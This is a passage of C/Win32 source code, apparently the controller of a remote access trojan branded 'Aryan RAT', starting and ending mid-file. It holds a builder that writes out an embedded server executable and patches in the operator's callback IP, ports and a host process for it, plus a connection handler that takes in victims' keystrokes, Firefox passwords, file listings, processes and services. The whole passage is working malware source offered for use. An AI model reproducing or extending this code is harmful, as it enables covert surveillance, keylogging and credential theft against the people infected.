			        Head.ID = atoi(WindowOut);
				    ProgHwnd[Head.ID] = NULL;
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

DWORD WINAPI AppsWindow(LPVOID lpParam)
{
	FileStruct * FILEWINDOW;
	FILEWINDOW = (FileStruct *) malloc(sizeof(FileStruct));
	FILEWINDOW = (FileStruct *)lpParam;
	char WindowText [50] = "";
	char COMPUTER [50] = "";
	char ID		  [10] = "";
	int LID = GID;
	HICON hIcon;

	strcpy(COMPUTER, WINDOWIP);

	ProgHwnd[LID]=CreateDialog(ProgInst,(LPCTSTR)IDD_INSTALLEDPROGS,NULL,(DLGPROC)ProgProc);
	ShowWindow(ProgHwnd[LID],SW_SHOW);
	ShowWindow(GetDlgItem(ProgHwnd[LID], IDC_ID),SW_HIDE);
	InitCommonControls();

	ZeroMemory(&WindowText[0],10);
	sprintf(&WindowText[0],"System Manager | %s", COMPUTER);
	sprintf(ID, "%d", LID);
	
	SetWindowText(ProgHwnd[LID], WindowText);
	SetWindowText(GetDlgItem(ProgHwnd[LID], IDC_ID), ID);
    Head.PacketType = PACKET_PROGRAM_FILES;
	Head.ID = LID; 
	strcpy(Head.Data, "");
    SentKb+=send(Client[LID],(char*)&Head,HeadSize,0);

	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);
	SendMessage(ProgHwnd[LID], WM_SETICON,ICON_SMALL,(LPARAM)hIcon);
	DeleteObject(hIcon);
	hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 32, 32, 0);
	SendMessage(ProgHwnd[LID], WM_SETICON,ICON_BIG,(LPARAM)hIcon);

	MSG msg;
	free(FILEWINDOW);
	while(GetMessage(&msg,ProgHwnd[LID],0,0)==TRUE)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
return 0;
}
/////////////////////////////////////////////////////////////////////////////////////////////////
//Edit Server
BOOL ReleaseResource(HMODULE hModule, WORD wResourceID, LPCTSTR lpType, char * Name)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;
    HANDLE hProcess;

	char	strTmpPath[MAX_PATH];
	char	strBinPath[MAX_PATH];
	
	strcpy(strBinPath, Name);

	//ssageBox(NULL, strBinPath, "strBinPath", MB_OK);
	
	hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	if (hResInfo == NULL)
	{
		MessageBox(NULL, "Failed", "FindResource", MB_OK);
		return FALSE;
	}
	
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
	{
		MessageBox(NULL, "Failed", "LoadResource", MB_OK);
		return FALSE;
	}
	hFile = CreateFile
		(strBinPath, 
		GENERIC_WRITE, 
		FILE_SHARE_WRITE, 
		NULL, 
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, 
		NULL
		);
	
	if (hFile == NULL)
	{
		MessageBox(NULL, "Failed", "CreateFile", MB_OK);
		return FALSE;
	}
	WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	//essageBox(NULL, strBinPath, "Buffer", MB_OK);
	CloseHandle(hFile);
	FreeResource(hRes);
	return TRUE;
}
#define BYTE_OFFSET_IP		0x00007780 //offset of our Buffer.
#define BYTE_OFFSET_PORT	0X00007810 //offset of our Buffer.
#define BYTE_OFFSET_PORTA	0X0000781C //offset of our Buffer.
#define BYTE_OFFSET_PROC	0x00006094 //offset of our Buffer.

LRESULT CALLBACK EditProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	int Select;
    char IP_ [30] = "127.0.0.1";
	char PORT_ [15] = "1000";
	char PORTA_ [15] = "1001";
	char Process [15] = "Notepad.exe";
	char Name [30] = "Server.exe";
	DWORD ret=0;
	HANDLE hFile;
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:			 
		SetWindowText(GetDlgItem(hwnd, IDC_IP), IP_);
		SetWindowText(GetDlgItem(hwnd, IDC_MAINPORT), PORT_);
		SetWindowText(GetDlgItem(hwnd, IDC_FILEPORT), PORTA_);
		SetWindowText(GetDlgItem(hwnd, IDC_PROCESS), Process);
		SetWindowText(GetDlgItem(hwnd, IDC_NAME), Name);

			break;
	case WM_COMMAND:
		Select=LOWORD(wParam);
		switch(Select)
		{
		case IDC_BUILD:
		GetWindowText(GetDlgItem(hwnd, IDC_IP), IP_, 30);
		GetWindowText(GetDlgItem(hwnd, IDC_MAINPORT), PORT_, 15);
		GetWindowText(GetDlgItem(hwnd, IDC_FILEPORT), PORTA_, 15);
		GetWindowText(GetDlgItem(hwnd, IDC_PROCESS), Process, 15);
		GetWindowText(GetDlgItem(hwnd, IDC_NAME), Name, 30);
		ReleaseResource(NULL, IDR_EXE, "BINARY", Name);
// open Server.exe for editing
		hFile = CreateFile(Name, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

		if(hFile == INVALID_HANDLE_VALUE)
		{
		MessageBox(NULL, "Failed to open", "Failed", MB_OK);
		return -0;
		}



		SetFilePointer(hFile, BYTE_OFFSET_IP, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
		WriteFile(hFile, IP_, sizeof("xxxx256.256.256.256xxxx"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

		ret=0;
		SetFilePointer(hFile, BYTE_OFFSET_PORT, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
		WriteFile(hFile, PORT_, sizeof("$$$$$$$$"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

		ret=0;
		SetFilePointer(hFile, BYTE_OFFSET_PORTA, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
		WriteFile(hFile, PORTA_, sizeof("$$$$$$$$"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/

		ret=0;
		SetFilePointer(hFile, BYTE_OFFSET_PROC, NULL, FILE_BEGIN); /* set the file pointer to the start of our buffer that we want to edit*/
		WriteFile(hFile, Process, sizeof("xxxxxxxxxxxxxxxxxxxxx"), &ret, NULL); /* overwrite our buffer(char IP) with the buffer(IP) the user enter'd*/
		
		CloseHandle(hFile);
		break;
		
		case IDCANCEL:
					EndDialog(hwnd,Select);
					break;
		}

//////////////////////////////////////////////////////////////////////////////// 
	default:
		return FALSE;
	}
return TRUE;
}

/////////////////////////////////////////////////////////////////////////////////////////////////
//main callback
FILE * Logs[1024];

LRESULT CALLBACK MainProc(HWND Dlg,UINT message,WPARAM wParam,LPARAM lParam)
{
	
	int         Select;
	int         Bytes_recv = 0;
	int			W = 0;
	int			i=0;
	LV_COLUMN	col;
	LV_ITEM		item;
	char        Buffer [1024] = "";
	int Pos = 0;
	HANDLE hFile;
	BOOL bSuccess = FALSE;
	LPSTR pszFileText;
	HWND Status = 0;
//    HWND Shell;
	HWND hEdit;
//	COLORREF Col;
	int ndx;
//	int dx;
//	HWND hCmd;
	HwND = Dlg;
	HMENU hmenu;            // menu template          
    HMENU hmenuTrackPopup;  // shortcut menu   
    POINT  pt;   // location of mouse click  
	LVBKIMAGE IBBkImg;
    CHARFORMAT cf;
	RECT rc;
//	SCROLLINFO si;
//    SIZE sz;
//	INITCOMMONCONTROLSEX ex;
    int NumberF;
	char Number [20] = "";
	char filename [50] = "";
	char IPBUFFER [50] = "";
	char FINALIPBUFFER [50] = "";
	HICON hIcon;
	FileStruct Window;
	int statwidths[] = {160, 300, 500 ,-1};
	TCITEM tie;
	UPNPNAT nat;
	nat.init(5,10);
	char PORTA [12] = "";
	char PORTB [12] = "";

      WORD wVersionRequested;
      WSADATA wsaData;
      char name[255];
      char * ip = "";
	  char * ServiceName = "";
      PHOSTENT hostinfo;
      wVersionRequested = MAKEWORD( 2, 0 );

	     CHOOSECOLOR cc;
		    DWORD dwColors[ 16 ];
	switch(message)
	{
////////////////////////////////////////////////////////////////////////////////
	case WM_INITDIALOG:			
      if ( WSAStartup( wVersionRequested, &wsaData ) == 0 )
      {

            if( gethostname ( name, sizeof(name)) == 0)
            {
                  if((hostinfo = gethostbyname(name)) != NULL)
                  {
                        ip = inet_ntoa (*(struct in_addr *)*hostinfo->h_addr_list);
                  }
            }

            WSACleanup( );
      }
	  	SetWindowText(GetDlgItem(Dlg, IDC_IPADDRESS) ,ip);
		SetWindowText(GetDlgItem(Dlg, IDC_SERIVCENAME) , "Aryan RAT");
		SetWindowText(GetDlgItem(Dlg, IDC_MAINPORT) ,"1000");
		SetWindowText(GetDlgItem(Dlg, IDC_FILEPORT) , "1001");

			hImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
			ImageList_SetBkColor(hImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]
			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_ARYAN), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FLOPPY), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);
			
			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CD), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);								      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);
			
			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_NETWORK), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);								      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);	// no need it after loading the bitmap

		    hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FOLDER), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);								      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_STATIC), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FIREFOX), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);						      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_SERVICE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FOLDER), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);
			
		    hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FILE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_EXE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_COMPRESSED), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_MEDIA), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_PICTURE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_TEXT), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_VIDEO), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_IE), IMAGE_ICON, 16, 16, 0);				  // load the picture from the resource
			ImageList_AddIcon(hImageList, hIcon);

			DeleteObject(hIcon);

			cImageList=ImageList_Create(16,16,ILC_COLOR16,20,30);
			ImageList_SetBkColor(cImageList,CLR_NONE);// Macro: 16x16:16bit with 2 pics [array]

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_CONNECTION), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

		    hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_HIGHPING), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_MEDIUMPING), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_LOWPING), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FILE_PLAY), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FILE_PAUSE), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FILE_STOP), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);

			hIcon=(HICON)LoadImage(GetModuleHandle(NULL), MAKEINTRESOURCE(IDI_FILE_UP), IMAGE_ICON, 32, 32, 0);				  // load the picture from the resource
			ImageList_AddIcon(cImageList, hIcon);							      // Macro: Attach the image, to the image list
			DeleteObject(hIcon);
		//AnimateWindow(Dlg, 500, AW_BLEND);
       HwND = Dlg;
        /////////////////////////////////////////////////////////////
		//initiating Server list.
	    ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_SERVERLIST),LVS_EX_CHECKBOXES | LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH|LVIF_IMAGE;
		col.cx=50;

		col.pszText="ID";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),0,&col);
		col.cx=100;
		col.pszText="UserName";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),1,&col);
		col.cx=100;
		col.pszText="User level";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),2,&col);
		col.cx=150;
		col.pszText="IP / Computer Name";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),3,&col);
		col.cx=230;
		col.pszText="OS / version";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),4,&col);
		col.cx=100;
		col.pszText="RAM";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),5,&col);
		col.cx=200;
		col.pszText="CPU";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),6,&col);
		col.cx=110;
		col.pszText="Screen Resolution.";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),7,&col);
		col.cx=100;
		col.pszText="Server Version.";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_SERVERLIST),8,&col);

	    ListView_SetImageList(GetDlgItem(Dlg, IDC_SERVERLIST),cImageList, LVSIL_SMALL);
        /////////////////////////////////////////////////////////////
		//initiating Logs list
		ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_LOGS), LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=180;
		col.pszText="Date & Time";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),0,&col);
		col.cx=180;
		col.pszText="Operation";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),1,&col);
		col.cx=200;
		col.pszText="About";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),2,&col);
	    col.cx=80;
		col.pszText="Fail/Pass";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_LOGS),3,&col);
	    /////////////////////////////////////////////////////////////
		//initiating ConnectionStatus's
		ListView_SetExtendedListViewStyle(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS), LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
		col.mask=LVCF_TEXT|LVCF_WIDTH;
		col.cx=80;
		col.pszText="Socket";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS),0,&col);
		col.cx=80;
		col.pszText="Status";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS),1,&col);
		col.cx=180;
		col.pszText="Last updated";
		ListView_InsertColumn(GetDlgItem(Dlg,IDC_CONNECTIONSTATUS),2,&col);
       
	   SendMessage (GetDlgItem(Dlg, IDC_SERVERLIST),LVM_SETBKIMAGE,0,(LPARAM)(LPLVBKIMAGE) &IBBkImg);
      hStatus = CreateWindowEx(0, STATUSCLASSNAME, NULL, 
      WS_CHILD | WS_VISIBLE | SBARS_SIZEGRIP, 0, 0, 0, 0, 
      Dlg, (HMENU)IDC_MAIN_STATUS, GetModuleHandle(NULL), NULL);
		
		

		SendMessage(hStatus, SB_SETPARTS, 4, (LPARAM)statwidths);
		SendMessage(hStatus, SB_SETTEXT, 0, (LPARAM)"Connection status: Not listening");
		sprintf(filename, "Ports: %d & %d", ServerPort, FilePort);
		SendMessage(hStatus, SB_SETTEXT, 1, (LPARAM)filename);
		ZeroMemory(filename, sizeof(filename));
		sprintf(filename, "Sent: %dBytes / Recv: %dBytes", SentKb, RecvKb);
		SendMessage(hStatus, SB_SETTEXT, 2, (LPARAM)filename);
		SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)"Connections: 0");

		
	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Server List";
	
	TabCtrl_InsertItem(GetDlgItem(Dlg, IDC_TAB3), 0, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Logs";
	
	TabCtrl_InsertItem(GetDlgItem(Dlg, IDC_TAB3), 1, &tie);

	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Setting's";
	
	TabCtrl_InsertItem(GetDlgItem(Dlg, IDC_TAB3), 2, &tie);

/*	tie.mask = TCIF_TEXT | TCIF_IMAGE;  
    tie.pszText = "Build";
	
	TabCtrl_InsertItem(GetDlgItem(Dlg, IDC_TAB3), 3, &tie);*/

			 GetClientRect(Dlg, &rc);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGS2 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT1 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT2 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SETTINGTEXT3 ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_IPADDRESS ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_FILEPORT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_MAINPORT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_SERIVCENAME ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_MAINPORT ),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR3),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR2),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR3),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYLOGGERCOLOURS),SW_HIDE);
			 //
			 ShowWindow(GetDlgItem(Dlg, IDC_TEXTNORMAL),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_TIME),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_WINDOWTEXT),SW_HIDE);

			 ShowWindow(GetDlgItem(Dlg, IDC_BACKGROUND),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYCOLOUR4),SW_HIDE);
			 ShowWindow(GetDlgItem(Dlg, IDC_KEYSCOLOUR4),SW_HIDE);
			 
			 ShowWindow(GetDlgItem(Dlg, IDC_OKSETTING),SW_HIDE);

			 ShowWindow(GetDlgItem(Dlg, IDC_LOGS),SW_HIDE);
			 MoveWindow(GetDlgItem(Dlg, IDC_LOGS),0,0,rc.right, rc.bottom - 50, TRUE);

			 ShowWindow(GetDlgItem(Dlg, IDC_SERVERLIST ),SW_SHOW);
			 MoveWindow(GetDlgItem(Dlg, IDC_SERVERLIST),0,0,rc.right, rc.bottom - 50, TRUE);
			 MoveWindow(GetDlgItem(Dlg, IDC_TAB3),0,0,rc.right, rc.bottom - 20, TRUE);			 
			 MoveWindow(hStatus,0,rc.bottom - 20,rc.right, 20, TRUE);
				
			 ZeroMemory(filename, sizeof(filename));
			 sprintf(filename, "%d", dwTextColor);
			 SetWindowText(GetDlgItem(Dlg, IDC_KEYCOLOUR) ,filename);

			 ZeroMemory(filename, sizeof(filename));
			 sprintf(filename, "%d",dwTimeColor );
			 SetWindowText(GetDlgItem(Dlg, IDC_KEYCOLOUR2) ,filename);

			 ZeroMemory(filename, sizeof(filename));
			 sprintf(filename, "%d", dwTitleColor);
			 SetWindowText(GetDlgItem(Dlg, IDC_KEYCOLOUR3) ,filename);

			 ZeroMemory(filename, sizeof(filename));
			 sprintf(filename, "%d", dwBackColor);
			 SetWindowText(GetDlgItem(Dlg, IDC_KEYCOLOUR4) ,filename);
		break;
///////////////////////////////////////////////////////////////////////////////////////////////////////		
	case RATMSG_SOCKET:
		Event=WSAGETSELECTEVENT(lParam);
		switch(Event)
		{
		case FD_CLOSE:			
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_ACCEPT:
			while(FClient[S] != NULL)
			{
			S++;
			if(S == 1025)
			{
			Connections++;
			strcpy(ConnectionsA, "");
			sprintf(ConnectionsA, "Connections: %d - Connection limit reached.",Connections); 
			SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConnectionsA);
			S= 0;
			}
			}
		    Head.PacketType = PACKET_ADD_ID;
			Client[S]=accept(wParam,(LPSOCKADDR)&ServAdr,&AdrLen);
            Head.ID = S;
			S++;
			SentKb+=send(Client[Head.ID], (char *)&Head, sizeof(Head), 0);
////////////////////////////////////////////////////////////////////////////////////////////
			Connections++;
			strcpy(ConnectionsA, "");
			sprintf(ConnectionsA, "Connections: %d",Connections); 
			SendMessage(hStatus, SB_SETTEXT, 3, (LPARAM)ConnectionsA);
			break;
/////////////////////////////////////////////////////////////////////////////////////////////
		case FD_READ:
		RecvKb+=recv(wParam,(char*)&Recv,RecvSize,0);
	
			switch (Recv.PacketType)
			{
		/*	case PACKET_CMD_RECV:
				 hEdit = GetDlgItem (CmdHwnd[Recv.ID], IDC_CMD1);
				 ndx = GetWindowTextLength (hEdit);
				 SetFocus (hEdit);
				 SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);
				// MessageBox(NULL, Recv.Data, "Recv.Data", MB_OK);
				 SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Recv.Data));
				 break;*/
			case PACKET_PROGRAM_FILES:
				SetProg(Recv.Buf, Recv.Data, Recv.ID);
				break;
			case PACKET_FILE_MANAGER_DRIVE:
				 SetDrive(Recv.Data, Recv.ID);
				 break;
			case DONE:
				NumberF = ListView_GetItemCount(GetDlgItem(SearchHwnd[Recv.ID],IDC_SEARCHLIST));
				sprintf(Number, "%d Files Found!", NumberF);
				SendMessage(GetDlgItem(SearchHwnd[Recv.ID],IDC_SEARCH_STATUS), SB_SETTEXT, 0, (LPARAM)Number);
				break;
			case PACKET_FILE_MANAGER_FILE:
				 SetFile(Recv.Data, Recv.ParentPID, Recv.ID, Recv.ID2, Recv.ID3);
				 break;
			case PACKET_USER_JOINED:
				 SetServer(Recv.Buf, Recv.Buf2, Recv.Buf3, Recv.Data, Recv.ParentPID, Recv.PID, Recv.PRIORITY, Recv.Threads, Recv.IDS);
				 break;
			case PACKET_COMPUTER_SHUTDOWN:
				 MessageBox(NULL, Recv.Data, "Alert", MB_OK | MB_ICONINFORMATION);
			case PACKET_TASK_MANAGER:
			     SetProc(Recv.Data, Recv.PID, Recv.ParentPID, Recv.Threads, Recv.PRIORITY, Recv.Buf ,Recv.ID);
				 break;
			case PACKET_TASK_MANAGER_TASKS:
		         SetTask(Recv.Data,Recv.Buf ,Recv.ID);
				 break;
			case PASSWORD_FIREFOX:
				SetPasswords(Recv.Buf3, Recv.Buf, Recv.Data, Recv.ID, Recv.ID2);
				break;
			case PACKET_SERVICE_MAN:
				SetServices(Recv.Data, Recv.Buf2, Recv.Buf3, Recv.Buf, Recv.ID);
				break;
			case PACKET_FILE_MANAGER_SEARCH:
				 SetSearch(Recv.Data, Recv.ID);
				 break;
			case PACKET_KEYLOGGER:
				  hEdit = GetDlgItem (KeyHwnd[Recv.ID], IDC_KEYS);
				 ndx = GetWindowTextLength (hEdit);
				 SetFocus (hEdit);
				 SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);

			

            memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure

            cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
            cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
            cf.crTextColor = dwTextColor;
            cf.yHeight = 32;
            strcpy( cf.szFaceName, "MS Sans Serif" );
                              //  Set character formatting and background color
                 SendDlgItemMessage(KeyHwnd[Recv.ID], IDC_KEYS, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf );
				 SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Recv.Data));
				 break;

			case PACKET_KEYLOGGER_WINDOW:
				 GetTime();
				 strcpy(Buffer, "\r\n \r\n[");
				 strcat(Buffer, Time);
				 Buffer[strlen(Buffer) -1] = '\0';
				 strcat(Buffer, "]");

				 hEdit = GetDlgItem (KeyHwnd[Recv.ID], IDC_KEYS);
				 ndx = GetWindowTextLength (hEdit);
				 SetFocus (hEdit);
				 SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);
				 
				 memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure

				cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
				cf.dwMask = CFM_COLOR | CFM_FACE | CFM_SIZE;  //  control structure
				cf.crTextColor = dwTimeColor;
				cf.yHeight = 32;
				strcpy( cf.szFaceName, "MS Sans Serif" );
                              //  Set character formatting and background color
				 SendDlgItemMessage( KeyHwnd[Recv.ID], IDC_KEYS, EM_SETCHARFORMAT, SCF_SELECTION, (LPARAM)&cf );
				 SendMessage (hEdit, EM_REPLACESEL, 0, (LPARAM) ((LPSTR) Buffer));
				 strcpy(Buffer, "[");
				 strcat(Buffer, Recv.Data);
				 strcat(Buffer, "] \r\n  \r\n");
				 
				 hEdit = GetDlgItem (KeyHwnd[Recv.ID], IDC_KEYS);
				 ndx = GetWindowTextLength (hEdit);
				 SetFocus (hEdit);
				 SendMessage (hEdit, EM_SETSEL, (WPARAM)ndx, (LPARAM)ndx);
				 
				 memset( &cf, 0, sizeof(CHARFORMAT) );      //  Initialize structure

				cf.cbSize = sizeof(CHARFORMAT);             //  Initialize RichEdit
